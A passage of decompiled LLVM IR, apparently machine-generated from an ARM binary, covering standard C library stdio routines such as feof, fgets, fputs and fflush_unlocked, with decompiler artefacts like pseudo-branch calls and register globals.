  %v1_14254 = add i32 %v0_14254, 1
  store i32 %v1_14254, i32* %r8.global-to-local, align 4
  %v1_14258 = add i32 %v3_14250, 2
  store i32 %v1_14258, i32* %r3.global-to-local, align 4
  %v6_14260 = icmp slt i32 %v1_14254, %v1_14258
  br i1 %v6_14260, label %dec_label_pc_141bc, label %dec_label_pc_14280

dec_label_pc_14268:                               ; preds = %dec_label_pc_141b0
  %v0_14268 = load i32, i32* %r7.global-to-local, align 4
  %v1_14268 = add i32 %v0_14268, 28
  %v2_14268 = inttoptr i32 %v1_14268 to i32*
  %v3_14268 = load i32, i32* %v2_14268, align 4
  store i32 %v3_14268, i32* %r2.global-to-local, align 4
  %v0_1426c = load i32, i32* %r0.global-to-local, align 4
  %v1_1426c = trunc i32 %v0_1426c to i8
  %v3_1426c = add i32 %v0_14268, 38
  %v4_1426c = inttoptr i32 %v3_1426c to i8*
  store i8 %v1_1426c, i8* %v4_1426c, align 1
  %v0_14270 = load i32, i32* %r2.global-to-local, align 4
  %v3_14270 = mul i32 %v0_14270, 4
  store i32 %v3_14270, i32* @r2, align 4
  %v0_14274 = load i32, i32* %r7.global-to-local, align 4
  %v1_14274 = add i32 %v0_14274, 40
  store i32 %v1_14274, i32* @r0, align 4
  %v2_14278 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14278, i32* @r1, align 4
  %v0_1427c = call i32 @memcpy()
  store i32 %v0_1427c, i32* %r0.global-to-local, align 4
  %v0_14280.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14250, %dec_label_pc_14268
  %v2_1429c = phi i32 [ %v0_14280.pre, %dec_label_pc_14268 ], [ %v0_14250, %dec_label_pc_14250 ]
  %v1_14280 = add i32 %v2_1429c, 16
  %v2_14280 = inttoptr i32 %v1_14280 to i32*
  %v3_14280 = load i32, i32* %v2_14280, align 4
  store i32 %v3_14280, i32* %r3.global-to-local, align 4
  %v1_14284 = and i32 %v3_14280, 128
  %v2_14284 = icmp eq i32 %v1_14284, 0
  br i1 %v2_14284, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_14280
  store i32 %v2_13e28, i32* %r3.global-to-local, align 4
  %v2_1428c = inttoptr i32 %v2_1429c to i32*
  %v3_1428c = load i32, i32* %v2_1428c, align 4
  %v2_14294.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_14294 = sub i32 %v2_14294.pre, %v2_13e28
  store i32 %v3_14294, i32* %r3.global-to-local, align 4
  %v5_14298 = mul i32 %v3_14294, 4
  %v6_14298 = add i32 %v5_14298, %v3_1428c
  store i32 %v6_14298, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_14280
  %v1_1429041 = load i32, i32* %r6.global-to-local, align 4
  %v2_1429042 = add i32 %v1_1429041, 1
  store i32 %v2_1429042, i32* %r3.global-to-local, align 4
  %v3_1429c = inttoptr i32 %v2_1429c to i32*
  store i32 %v2_1429042, i32* %v3_1429c, align 4
  %v0_142a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_142a8 = phi i32 [ %v2_1429c, %.thread44 ], [ %v0_142a0.pre, %.thread46 ]
  %v1_142a0 = add i32 %v1_142a8, 28
  %v2_142a0 = inttoptr i32 %v1_142a0 to i32*
  %v3_142a0 = load i32, i32* %v2_142a0, align 4
  store i32 %v3_142a0, i32* %r3.global-to-local, align 4
  %v1_142a4 = add i32 %v3_142a0, 2
  store i32 %v1_142a4, i32* %r0.global-to-local, align 4
  %v0_142a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_142a8 = add i32 %v1_142a8, 24
  %v3_142a8 = inttoptr i32 %v2_142a8 to i32*
  store i32 %v0_142a8, i32* %v3_142a8, align 4
  br i1 %v2_14284, label %dec_label_pc_142b8, label %bb147

bb147:                                            ; preds = %bb146
  %v1_142ac = load i32, i32* @r2, align 4
  %v2_142ac = load i32, i32* %r7.global-to-local, align 4
  %v3_142ac = inttoptr i32 %v2_142ac to i32*
  store i32 %v1_142ac, i32* %v3_142ac, align 4
  br label %dec_label_pc_142b8

dec_label_pc_142b4:                               ; preds = %dec_label_pc_13e70, %dec_label_pc_13f7c, %dec_label_pc_1402c, %dec_label_pc_14000, %dec_label_pc_1400c, %dec_label_pc_13f4c, %dec_label_pc_141ec, %dec_label_pc_14198, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142b8

dec_label_pc_142b8:                               ; preds = %bb147, %bb146, %dec_label_pc_142b4
  %v2_142bc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_142bc, i32* @r4, align 4
  store i32 %v6_13e20, i32* @r5, align 4
  %v26_142bc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_142bc

; uselistorder directives
  uselistorder i32 %v3_14294, { 1, 0 }
  uselistorder i32 %v1_14254, { 1, 2, 0 }
  uselistorder i32 %v0_14208, { 1, 2, 0 }
  uselistorder i32 %v2_141e4, { 1, 0 }
  uselistorder i32 %v1_141e4, { 1, 0, 2 }
  uselistorder i32 %v0_14204, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_14148, { 1, 2, 0 }
  uselistorder i32 %v3_14130, { 1, 0 }
  uselistorder i32 %v3_14128, { 1, 0 }
  uselistorder i32 %v2_14108, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_140f0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_140d4, { 1, 0, 2 }
  uselistorder i32 %v3_140b4, { 2, 1, 0 }
  uselistorder i32 %v1_14078, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1404c, { 1, 0 }
  uselistorder i32 %v5_13fac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13fac, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_13f58, { 1, 0 }
  uselistorder i32 %v0_13f74, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_13f3c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13f24, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_13f10, { 1, 2, 0 }
  uselistorder i32 %v0_13f88, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13ec4, { 1, 0 }
  uselistorder i32 %v1_13e94, { 0, 2, 1 }
  uselistorder i32 %v25_13e20, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 17, 0, 3, 7, 4, 16, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 1, 18 }
  uselistorder i32* %r6.global-to-local, { 9, 13, 11, 14, 0, 2, 12, 3, 4, 5, 7, 10, 15, 6, 1, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 15, 14, 49, 50, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 39, 40, 41, 37, 38, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 15, 10, 16, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1cc90.895 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1cca0.893 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1cc7c.885 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_142b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_142b4, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_14280, { 1, 0 }
  uselistorder label %dec_label_pc_14250, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1423c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_141f8, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_141b0, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14064, { 1, 0 }
  uselistorder label %dec_label_pc_1403c, { 1, 0 }
  uselistorder label %dec_label_pc_13fec, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13f6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f68, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ec8, { 1, 0 }
  uselistorder label %dec_label_pc_13eb8, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_142e4 = load i32, i32* @r4, align 4
  store i32 %v3_142e4, i32* %stack_var_-16, align 4
  %v2_142e8 = add i32 %tmp, 52
  %v3_142e8 = inttoptr i32 %v2_142e8 to i32*
  %v4_142e8 = load i32, i32* %v3_142e8, align 4
  store i32 %v4_142e8, i32* %r6.global-to-local, align 4
  %v2_142f0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_142f4 = icmp eq i32 %v4_142e8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_142f0, i32* @r0, align 4
  br i1 %v2_142f4, label %dec_label_pc_1430c, label %dec_label_pc_14328

dec_label_pc_1430c:                               ; preds = %entry
  %v1_14314 = call i32 @__pthread_return_void()
  %v1_14324 = call i32 @__pthread_return_0()
  %v0_14328.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_14330.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14328

dec_label_pc_14328:                               ; preds = %entry, %dec_label_pc_1430c
  %v0_14330 = phi i32 [ %v4_142e8, %entry ], [ %v0_14330.pre, %dec_label_pc_1430c ]
  %v0_14328 = phi i32 [ %tmp, %entry ], [ %v0_14328.pre, %dec_label_pc_1430c ]
  %v1_14328 = add i32 %v0_14328, 1
  %v2_14328 = inttoptr i32 %v1_14328 to i8*
  %v3_14328 = load i8, i8* %v2_14328, align 1
  %v4_14328 = zext i8 %v3_14328 to i32
  %v1_1432c = inttoptr i32 %v0_14328 to i8*
  %v2_1432c = load i8, i8* %v1_1432c, align 1
  %v3_1432c = zext i8 %v2_1432c to i32
  %v2_14330 = icmp eq i32 %v0_14330, 0
  %v4_1433c = mul nuw nsw i32 %v4_14328, 256
  %v5_1433c = or i32 %v3_1432c, %v4_1433c
  store i32 %v5_1433c, i32* %r4.global-to-local, align 4
  br i1 %v2_14330, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14328
  call void @__pseudo_branch(i32 92940)
  %v0_1434c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14328, %bb
  %v0_1434c = phi i32 [ %v5_1433c, %dec_label_pc_14328 ], [ %v0_1434c.pre, %bb ]
  %v1_1434c = and i32 %v0_1434c, 4
  %v2_14354 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14354, i32* @r4, align 4
  ret i32 %v1_1434c

; uselistorder directives
  uselistorder i32 %v0_14328, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14328, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14368 = load i32, i32* @r4, align 4
  store i32 %v3_14368, i32* %stack_var_-24, align 4
  %v6_14368 = load i32, i32* @r5, align 4
  %v9_14368 = load i32, i32* @r6, align 4
  %v12_14368 = load i32, i32* @r7, align 4
  %v1_1436c = add i32 %arg3, 52
  %v2_1436c = inttoptr i32 %v1_1436c to i32*
  %v3_1436c = load i32, i32* %v2_1436c, align 4
  store i32 %v3_1436c, i32* %r8.global-to-local, align 4
  %v2_14370 = ptrtoint i32* %stack_var_-40 to i32
  %v1_14374 = add i32 %arg3, 56
  store i32 %v1_14374, i32* @r5, align 4
  %v2_14378 = icmp eq i32 %v3_1436c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_14370, i32* @r0, align 4
  br i1 %v2_14378, label %dec_label_pc_14398, label %dec_label_pc_143b4

dec_label_pc_14398:                               ; preds = %entry
  %v1_143a0 = call i32 @__pthread_return_void()
  store i32 82868, i32* @lr, align 4
  %v1_143b0 = call i32 @__pthread_return_0()
  %v0_143b4.pre = load i32, i32* @r6, align 4
  %v0_143b8.pre = load i32, i32* @r4, align 4
  %v0_143bc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %entry, %dec_label_pc_14398
  %v0_143bc = phi i32 [ %arg1, %entry ], [ %v0_143bc.pre, %dec_label_pc_14398 ]
  %v0_143b8 = phi i32 [ %arg3, %entry ], [ %v0_143b8.pre, %dec_label_pc_14398 ]
  %v0_143b4 = phi i32 [ %arg2, %entry ], [ %v0_143b4.pre, %dec_label_pc_14398 ]
  %v3_143c0 = inttoptr i32 %v0_143bc to i8*
  %v4_143c0 = call i32 @__GI_fgets_unlocked(i8* %v3_143c0, i32 %v0_143b4, i32 %v0_143b8)
  %v0_143c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_143c4 = icmp eq i32 %v0_143c4, 0
  store i32 %v4_143c0, i32* %r4.global-to-local, align 4
  br i1 %v2_143c4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_143b4
  store i32 82912, i32* @lr, align 4
  call void @__pseudo_branch(i32 92940)
  %v0_143e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_143b4, %bb
  %v0_143e0 = phi i32 [ %v4_143c0, %dec_label_pc_143b4 ], [ %v0_143e0.pre, %bb ]
  %v2_143e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_143e8, i32* @r4, align 4
  store i32 %v6_14368, i32* @r5, align 4
  store i32 %v9_14368, i32* @r6, align 4
  store i32 %v12_14368, i32* @r7, align 4
  ret i32 %v0_143e0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_143b4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_143fc = load i32, i32* @r4, align 4
  store i32 %v3_143fc, i32* %stack_var_-20, align 4
  %v6_143fc = load i32, i32* @r5, align 4
  %v9_143fc = load i32, i32* @r6, align 4
  %v12_143fc = load i32, i32* @r7, align 4
  %v1_14400 = add i32 %arg2, 52
  %v2_14400 = inttoptr i32 %v1_14400 to i32*
  %v3_14400 = load i32, i32* %v2_14400, align 4
  store i32 %v3_14400, i32* @r7, align 4
  %v1_14404 = add i32 %arg2, 56
  store i32 %v1_14404, i32* @r5, align 4
  %v2_14408 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1440c = icmp eq i32 %v3_14400, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_14408, i32* @r0, align 4
  br i1 %v2_1440c, label %dec_label_pc_14428, label %dec_label_pc_14444

dec_label_pc_14428:                               ; preds = %entry
  %v1_14430 = call i32 @__pthread_return_void()
  store i32 83012, i32* @lr, align 4
  %v1_14440 = call i32 @__pthread_return_0()
  %v0_14444.pre = load i32, i32* @r4, align 4
  %v0_14448.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %entry, %dec_label_pc_14428
  %v0_14448 = phi i32 [ %arg1, %entry ], [ %v0_14448.pre, %dec_label_pc_14428 ]
  %v0_14444 = phi i32 [ %arg2, %entry ], [ %v0_14444.pre, %dec_label_pc_14428 ]
  %v2_1444c = inttoptr i32 %v0_14448 to i8*
  %v3_1444c = call i32 @__GI_fputs_unlocked(i8* %v2_1444c, i32 %v0_14444)
  %v0_14450 = load i32, i32* @r7, align 4
  %v2_14450 = icmp eq i32 %v0_14450, 0
  store i32 %v3_1444c, i32* %r4.global-to-local, align 4
  br i1 %v2_14450, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14444
  call void @__pseudo_branch(i32 92940)
  %v0_1446c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14444, %bb
  %v0_1446c = phi i32 [ %v3_1444c, %dec_label_pc_14444 ], [ %v0_1446c.pre, %bb ]
  %v2_14474 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14474, i32* @r4, align 4
  store i32 %v6_143fc, i32* @r5, align 4
  store i32 %v9_143fc, i32* @r6, align 4
  store i32 %v12_143fc, i32* @r7, align 4
  ret i32 %v0_1446c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14444, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1448c = ptrtoint i32* %stack_var_-48 to i32
  %v2_14490 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_14490, i32* @r0, align 4
  store i32 92940, i32* %r4.global-to-local, align 4
  %v1_144a4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r5.global-to-local, align 4
  %v1_144b4 = call i32 @__pthread_return_0()
  %v2_144bc = load i32, i32* @global_var_2a5ec.831, align 4
  %v7_144c0 = icmp eq i32 %v2_144bc, 1
  br i1 %v7_144c0, label %dec_label_pc_144c8, label %dec_label_pc_14574

dec_label_pc_144c8:                               ; preds = %entry
  %v2_144cc = load i32, i32* @global_var_2a5f0.836, align 4
  %tmp19 = icmp slt i32 %v2_144cc, 1
  br i1 %tmp19, label %dec_label_pc_14574, label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c8
  store i32 %v2_1448c, i32* @r0, align 4
  %v1_144e8 = call i32 @__pthread_return_void()
  %v1_144f4 = call i32 @__pthread_return_0()
  %v2_144fc = load i32, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  store i32 %v2_144fc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1454c3 = icmp eq i32 %v2_144fc, 0
  br i1 %v2_1454c3, label %dec_label_pc_14558, label %dec_label_pc_14508

dec_label_pc_14508:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_14548
  %v1_14520 = phi i32 [ %v0_14548, %dec_label_pc_14548 ], [ %v2_144fc, %dec_label_pc_144d8 ]
  %v1_14508 = inttoptr i32 %v1_14520 to i8*
  %v2_14508 = load i8, i8* %v1_14508, align 1
  %v3_14508 = zext i8 %v2_14508 to i32
  %v1_1450c = add i32 %v1_14520, 1
  %v2_1450c = inttoptr i32 %v1_1450c to i8*
  %v3_1450c = load i8, i8* %v2_1450c, align 1
  %v4_1450c = zext i8 %v3_1450c to i32
  %v4_14510 = mul nuw nsw i32 %v4_1450c, 256
  %v5_14510 = or i32 %v4_14510, %v3_14508
  %v2_14514 = and i32 %v5_14510, 32816
  %v7_14518 = icmp eq i32 %v2_14514, 48
  %v1_1451c = add i32 %v1_14520, 32
  %v2_1451c = inttoptr i32 %v1_1451c to i32*
  %v3_1451c = load i32, i32* %v2_1451c, align 4
  store i32 %v3_1451c, i32* %r5.global-to-local, align 4
  br i1 %v7_14518, label %dec_label_pc_14528, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_14508
  store i32 %v1_14520, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14548

dec_label_pc_14528:                               ; preds = %dec_label_pc_14508
  %v0_14528 = load i32, i32* %r6.global-to-local, align 4
  %v2_14528 = icmp eq i32 %v0_14528, 0
  br i1 %v2_14528, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_14528
  %v3_14530 = add i32 %v0_14528, 32
  %v4_14530 = inttoptr i32 %v3_14530 to i32*
  store i32 %v3_1451c, i32* %v4_14530, align 4
  %v0_14538.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_14528
  store i32 %v3_1451c, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_14538 = phi i32 [ %v0_14538.pre, %.thread ], [ %v1_14520, %.thread1 ]
  %v1_14538 = add i32 %v0_14538, 1
  %v2_14538 = inttoptr i32 %v1_14538 to i8*
  %v3_14538 = load i8, i8* %v2_14538, align 1
  %v1_1453c = and i8 %v3_14538, 32
  %v1_14544 = icmp ne i8 %v1_1453c, 0
  call void @__pseudo_cond_branch(i1 %v1_14544, i32 ptrtoint (i32* @global_var_15a00.833 to i32))
  %v0_14548.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14548

dec_label_pc_14548:                               ; preds = %.thread12, %bb
  %v0_14548 = phi i32 [ %v0_14548.pre, %bb ], [ %v3_1451c, %.thread12 ]
  store i32 %v0_14548, i32* %r4.global-to-local, align 4
  %v2_1454c = icmp eq i32 %v0_14548, 0
  br i1 %v2_1454c, label %dec_label_pc_14558, label %dec_label_pc_14508

dec_label_pc_14558:                               ; preds = %dec_label_pc_14548, %dec_label_pc_144d8
  store i32 %v2_1448c, i32* @r0, align 4
  %v1_14568 = call i32 @__pthread_return_void()
  %v0_14570 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14570, i32* @global_var_2a5f0.836, align 4
  %v2_14578.pre = load i32, i32* @global_var_2a5ec.831, align 4
  br label %dec_label_pc_14574

dec_label_pc_14574:                               ; preds = %entry, %dec_label_pc_144c8, %dec_label_pc_14558
  %v2_14578 = phi i32 [ %v2_144bc, %entry ], [ 1, %dec_label_pc_144c8 ], [ %v2_14578.pre, %dec_label_pc_14558 ]
  %v1_1457c = add i32 %v2_14578, -1
  store i32 %v1_1457c, i32* @global_var_2a5ec.831, align 4
  store i32 %v2_14490, i32* @r0, align 4
  store i32 83352, i32* @lr, align 4
  %v1_14594 = call i32 @__pthread_return_void()
  ret i32 %v1_14594

; uselistorder directives
  uselistorder i32 %v0_14548, { 2, 1, 0 }
  uselistorder i32 %v3_1451c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14520, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_2a5f0.836, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14574, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14548, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_14508, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_145c8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r3.global-to-local, align 4
  %v10_145d0 = icmp eq i8* %arg1, bitcast (i32** @global_var_26270.851 to i8*)
  store i1 %v10_145d0, i1* %cpsr_z.global-to-local, align 1
  %.v1_145d4 = select i1 %v10_145d0, i32 0, i32 %tmp
  store i32 %.v1_145d4, i32* %r8.global-to-local, align 4
  %v2_145dc = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_145d0, label %bb, label %dec_label_pc_145e8

bb:                                               ; preds = %entry
  store i32 %.v1_145d4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_145f4

dec_label_pc_145e8:                               ; preds = %entry
  %v2_145e8 = icmp eq i32 %.v1_145d4, 0
  store i1 %v2_145e8, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_145e8, label %dec_label_pc_145f4, label %dec_label_pc_14740

dec_label_pc_145f4:                               ; preds = %bb, %dec_label_pc_145e8
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_145dc, i32* @r0, align 4
  %v1_14608 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2628c.829 to i32), i32* %r0.global-to-local, align 4
  %v1_14618 = call i32 @__pthread_return_0()
  %v2_14620 = load i32, i32* @global_var_2a5ec.831, align 4
  %v1_14624 = add i32 %v2_14620, 1
  store i32 %v1_14624, i32* %r3.global-to-local, align 4
  store i32 %v1_14624, i32* @global_var_2a5ec.831, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_145dc, i32* @r0, align 4
  %v1_1463c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_145dc, i32* @r0, align 4
  %v1_14650 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_26274.848 to i32), i32* %r0.global-to-local, align 4
  %v1_1465c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_145dc, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1466c = load i32, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  store i32 %v2_1466c, i32* @r6, align 4
  %v1_14674 = call i32 @__pthread_return_void()
  store i32 %v1_14674, i32* %r0.global-to-local, align 4
  store i32 %v2_145dc, i32* @r4, align 4
  %v0_1467c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1467c, i32* @r5, align 4
  %v0_14730.pr = load i32, i32* @r6, align 4
  %v2_1473025 = icmp eq i32 %v0_14730.pr, 0
  store i1 %v2_1473025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1473025, label %dec_label_pc_14738, label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %dec_label_pc_145f4, %.thread11
  %v0_146a0 = phi i32 [ %v3_1472c, %.thread11 ], [ %v0_14730.pr, %dec_label_pc_145f4 ]
  %v1_14684 = inttoptr i32 %v0_146a0 to i8*
  %v2_14684 = load i8, i8* %v1_14684, align 1
  %v3_14684 = zext i8 %v2_14684 to i32
  store i32 %v3_14684, i32* %r3.global-to-local, align 4
  %v1_14688 = and i32 %v3_14684, 64
  %v2_14688 = icmp eq i32 %v1_14688, 0
  store i1 %v2_14688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14688, label %.thread11, label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_14684
  %v2_14694 = load i32, i32* @global_var_262a4.842, align 4
  store i32 %v2_14694, i32* %r3.global-to-local, align 4
  %v7_14698 = icmp eq i32 %v2_14694, 2
  store i1 %v7_14698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14698, label %dec_label_pc_146cc, label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_14690
  %v1_146a0 = add i32 %v0_146a0, 56
  store i32 %v1_146a0, i32* @r4, align 4
  store i32 %v2_145dc, i32* @r0, align 4
